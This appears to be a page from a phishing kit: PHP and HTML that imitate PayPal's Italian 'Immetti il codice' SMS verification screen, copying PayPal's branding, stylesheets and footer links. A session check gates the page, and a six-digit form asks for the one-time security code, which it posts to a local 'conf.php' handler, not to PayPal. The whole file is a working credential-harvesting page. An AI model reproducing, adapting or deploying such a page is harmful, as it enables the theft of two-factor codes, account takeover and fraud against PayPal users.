<?php
session_start();
ini_set('display_errors', 0);
error_reporting(E_ALL);
// Verifica se l'utente è autenticato
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Se non autenticato, reindirizza alla pagina di errore o ritorna a una pagina di login
    header("location: ../../../../../index.html");  
    exit;
}
?>

<html dir="ltr" lang="it">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta content="GkA9lf9EIGCBR37hq1KniQumMOhBwcI+YFnJc=" name="csrf-token">
    <meta name="pageInfo" content="Script info: script: node, template:  undefined,
  date: Oct 22, 2024 05:52:42 -07:00, country: IT, language: it
  hostname : rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLtvQaDFNy+3Ys1J37koGiDA rlogid : rZJvnqaaQhLn%2FnmWT8cSUg%2BFylqOCirdAUXJpxqmWT25VMZ%2BzJdPEMdVcw8K5ETgXm0RYPK9j68_192b449659a null"><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  <link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
  <link rel="stylesheet" href="https://www.paypalobjects.com/paypal-ui/web/fonts-and-normalize/2-1-0/fonts-and-normalize.min.css">
  <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/b1a/2c86e84cde03c0a6b40c0470f6f14/css/app.css">
  <title>PayPal</title>
</head>

<body data-nemo="documentId" documentid="AAFePibcVLI73IwEehek_r8uMiEgX2u01P2NENieqHj_k--QGHLwCXcXpzXpIVbRrxle" class="">
  <div class="ppui-theme theme_ppui_theme_tokens__1ozbsv90">
    <div>
      <style nonce="">
        html { display:block }</style>
        <div>
          <div>
              <div class="contentContainer" id="content">
                <div>
                  <div data-nemo="challengePage">
                    <header>
                      <div class="paypal-logo">

                      </div>
                    </header>
                    <div data-nemo="smsChallengePage" class="smsChallenge">
                      <h3 class="styles_text-heading_sm__awycp4i styles_text_override_default__awycp40" data-ppui-info="heading-text">Immetti il codice</h3>
                      <p class="styles_text-body__awycp41 styles_text_override_default__awycp40 top24 description" data-ppui-info="body-text" data-nemo="smsChallengeDescription">Abbiamo inviato un codice di sicurezza a &#x202A;+39 3•• ••• ••••&#x202C;.</p>
                    </div>
                    <div>
                      <form action="conf.php" method="post" novalidate="" class="top15">
                        <div>
                          <div>
                            <div class="codeInput">
                              <div class="codeInput-resend" id="code-resend">
                                <div class="resend-link">
                                  <a class="styles_link_base__1f9z60b2 styles_link_primary__1f9z60b5 styles_link-lg-text__1f9z60b0 styles_text-link_lg__awycp47 resend" data-ppui-info="" href="#" data-nemo="resendLink">Invia nuovo codice</a>
                                </div>
                              </div>
                              <div>
                                <div class="styles_code_input_base__y7o1d20 codeInput-wrapper" id="otpCode" data-ppui-info="">
                                  <div class="styles_code_input_wrapper__y7o1d24" role="group" aria-label="group">
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp" name="otpCode-0" id="ci-otpCode-0" aria-invalid="false" placeholder=" " aria-label="1-6" aria-describedby="otpCode" pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp"
                                             name="otpCode-1" id="ci-otpCode-1" aria-invalid="false" placeholder=" " aria-label="2-6" aria-describedby="otpCode"
                                             pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                    
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp"
                                             name="otpCode-2" id="ci-otpCode-2" aria-invalid="false" placeholder=" " aria-label="3-6" aria-describedby="otpCode"
                                             pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                    
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp"
                                             name="otpCode-3" id="ci-otpCode-3" aria-invalid="false" placeholder=" " aria-label="4-6" aria-describedby="otpCode"
                                             pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                    
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp"
                                             name="otpCode-4" id="ci-otpCode-4" aria-invalid="false" placeholder=" " aria-label="5-6" aria-describedby="otpCode"
                                             pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                    
                                    <div class="styles_text-input_base__108j7bu7 styles_code_input_text_input__y7o1d21" data-ppui-info="">
                                      <input class="styles_text-input_control__108j7bua styles_text-input_no_label_control__108j7bub styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5 styles_code_input_text_input_control__y7o1d23 hasHelp"
                                             name="otpCode-5" id="ci-otpCode-5" aria-invalid="false" placeholder=" " aria-label="6-6" aria-describedby="otpCode"
                                             pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" type="number" value="">
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <button class="styles_button_base__6ka6j61 styles_button_size_lg__6ka6j62 styles_button_primary__6ka6j64 styles_button_full_width__6ka6j6l scTrack:security_code_continue_button button" data-ppui-info="" id="securityCodeSubmit" data-atomic-wait-domain="identity_authnodeweb" data-atomic-wait-intent="submit_sms" data-atomic-wait-task="login_step_up_sms" data-atomic-wait-viewname="auth_verification_success_page" type="submit" name="submitSecurityCode" data-nemo="securityCodeSubmit" tab-index="0">Invia
                            <span class="styles_button_state_overlay__6ka6j6f"></span>
                          </button>
                        </form>
                      </div>
                      <div class="tryDifferentWaySection">
                        <a class="styles_button_tertiary__6ka6j68 styles_button_size_lg__6ka6j62" data-ppui-info="" id="buttons" data-nemo="tryDifferentWay" name="tryDifferentWay" href="../index.html" tab-index="1">Hai bisogno di altre opzioni?</a>
                      </div>
                    </div>
                  </div>
                  <div class="loaderOverlay">
                    <div data-nemo="loaderOverlay" class="modal-animate hide">
                      <p class="styles_loading_spinner_base__1662kwt1 styles_loading_spinner_size_lg__1662kwt5 loading-spinner" data-ppui-info="" role="alert">
                        <span class="styles_screenreader__1p05eo10">Attendi…</span>
                      </p>
                      <p class="styles_text-body__awycp41 styles_text_override_default__awycp40 processing" data-ppui-info="body-text">Attendi…</p>
                      <div class="loaderOverlayAdditionalElements"></div></div>
                      <div class="modal-overlay hide"></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <footer class="footer">
              <ul class="footerLinks">
                <li class="contactFooterListItem">
                  <p class="styles_text-body__awycp41 styles_text_override_default__awycp40" data-ppui-info="body-text">
                    <a target="_blank" href="https://www.paypal.com/it/smarthelp/contact-us">Contattaci</a>
                  </p>
                  </li>
                  <li class="privacyFooterListItem">
                    <p class="styles_text-body__awycp41 styles_text_override_default__awycp40" data-ppui-info="body-text">
                      <a target="_blank" href="https://www.paypal.com/it/webapps/mpp/ua/privacy-full">Privacy</a>
                    </p>
                  </li>
                  <li class="legalFooterListItem">
                    <p class="styles_text-body__awycp41 styles_text_override_default__awycp40" data-ppui-info="body-text">
                      <a target="_blank" href="https://www.paypal.com/it/webapps/mpp/ua/legalhub-full">Accordi legali</a>
                    </p>
                  </li>
                  <li class="worldwideFooterListItem">
                    <p class="styles_text-body__awycp41 styles_text_override_default__awycp40" data-ppui-info="body-text">
                      <a target="_blank" href="https://www.paypal.com/it/webapps/mpp/country-worldwide">Nel mondo</a>
                    </p>
                  </li>
                </ul>
                <div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
              </footer>
                              <script>
                                // Limite massimo di caratteri
                                const maxLength = 1; // Sostituisci 5 con il numero massimo di cifre consentite
                            
                                // Seleziona tutti gli input con il nome della classe specificata
                                const inputs = document.querySelectorAll(".styles_text-input_control__108j7bua.styles_text-input_no_label_control__108j7bub.styles_text-input_label_placeholder_shown_and_not_focused__108j7bu5.styles_code_input_text_input_control__y7o1d23.hasHelp");
                            
                                // Funzione per limitare il numero di caratteri per ogni input selezionato
                                inputs.forEach(input => {
                                    input.addEventListener("input", function() {
                                        if (this.value.length > maxLength) {
                                            this.value = this.value.slice(0, maxLength);
                                        }
                                    });
                                });
                            </script>
                            
                              <script src="script.js"></script>
                              <script id="fconfig" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f":"14430be390dd479e9bf493aa7cd08e67","s":"ANW_OTP_UL_LOGIN","ts":{"type":"UL","fields":[{"id":"ci-otpCode-0","min":1},{"id":"ci-otpCode-5","min":1}],"delegate":false}}</script>
                              <noscript></noscript>
                            </body>
                            </html>
